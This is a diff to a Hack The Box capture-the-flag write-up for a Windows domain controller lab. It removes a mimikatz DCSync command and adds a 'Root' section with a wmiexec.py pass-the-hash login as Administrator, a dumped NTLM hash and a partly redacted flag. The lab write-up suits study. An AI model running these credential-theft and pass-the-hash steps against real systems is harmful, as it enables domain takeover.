@@ -249,11 +249,19 @@ htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16
 ```
 
 
+## Root
 
-
-In our case we need to 
+Now we can connect to the Administrator account and access the last flag and totally own the box. 
 
 ```
-lsadump::dcsync /domain:testlab.local /user:Administrator
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
+```
 
-`
+![image](https://user-images.githubusercontent.com/5285547/124321560-d4a26080-db75-11eb-86cb-c5403c396985.png)
+
+
+- flag.txt
+
+```
+f04815{REDACTED}2b04d79129cc
+```
